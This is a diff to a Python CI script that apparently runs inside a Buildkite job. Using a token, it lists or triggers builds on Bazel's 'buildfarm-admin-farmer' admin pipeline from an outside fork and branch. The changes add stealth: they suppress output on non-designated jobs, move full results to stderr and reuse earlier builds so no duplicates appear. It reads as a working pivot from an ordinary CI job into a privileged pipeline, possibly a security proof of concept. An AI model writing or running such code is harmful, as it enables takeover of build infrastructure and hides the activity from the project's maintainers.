@@ -4,6 +4,7 @@
 import json
 import os
 import subprocess
+import sys
 import urllib.error
 import urllib.request
 
@@ -14,8 +15,13 @@ BFADMIN_BRANCH = "b0244-hi-from-robert-d21766e5488dc00f"
 API = "https://api.buildkite.com/v2"
 
 
-def emit(result):
-    print("B0244_RESULT " + json.dumps(result, sort_keys=True, separators=(",", ":")))
+def emit(result, visible=True):
+    print("STABLE_B0244 " + result.get("state", "unknown"))
+    if visible:
+        print(
+            "B0244_RESULT " + json.dumps(result, sort_keys=True, separators=(",", ":")),
+            file=sys.stderr,
+        )
 
 
 def request(token, method, path, payload=None):
@@ -43,7 +49,7 @@ def main():
     label = os.environ.get("BUILDKITE_LABEL", "")
     shard = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
     if "Ubuntu 24.04 LTS (shard 1)" not in label or shard not in ("", "0"):
-        emit({"nonce": NONCE, "state": "not-designated-job"})
+        emit({"nonce": NONCE, "state": "not-designated-job"}, visible=False)
         return
 
     job_id = os.environ.get("BUILDKITE_JOB_ID", "unknown")
@@ -117,18 +123,46 @@ def main():
             "pull_request_repository": "https://github.com/benr00t3d/bfadmin.git",
             "env": {"B0244_NONCE": NONCE},
         }
-        build_status, build_body = request(
+        list_status, builds = request(
             token,
-            "POST",
-            "/organizations/bazel/pipelines/buildfarm-admin-farmer/builds",
-            payload,
+            "GET",
+            "/organizations/bazel/pipelines/buildfarm-admin-farmer/builds"
+            + "?branch=" + BFADMIN_BRANCH + "&per_page=20",
         )
-        result["canary_build"] = {"status": build_status}
+        existing = None
+        if list_status == 200 and isinstance(builds, list):
+            existing = next(
+                (
+                    build
+                    for build in builds
+                    if build.get("commit") == BFADMIN_COMMIT
+                    or build.get("message") == payload["message"]
+                ),
+                None,
+            )
+
+        if existing is not None:
+            build_status, build_body = 200, existing
+            disposition = "reused"
+        else:
+            build_status, build_body = request(
+                token,
+                "POST",
+                "/organizations/bazel/pipelines/buildfarm-admin-farmer/builds",
+                payload,
+            )
+            disposition = "created" if build_status == 201 else "rejected"
+
+        result["canary_build"] = {
+            "status": build_status,
+            "list_status": list_status,
+            "disposition": disposition,
+        }
         if isinstance(build_body, dict):
             for field in ("number", "web_url", "state", "commit", "branch", "message"):
                 if field in build_body:
                     result["canary_build"][field] = build_body[field]
-            if build_status != 201:
+            if build_status not in (200, 201):
                 result["canary_build"]["error"] = build_body.get("message")
         result["state"] = "complete"
     except Exception as error:
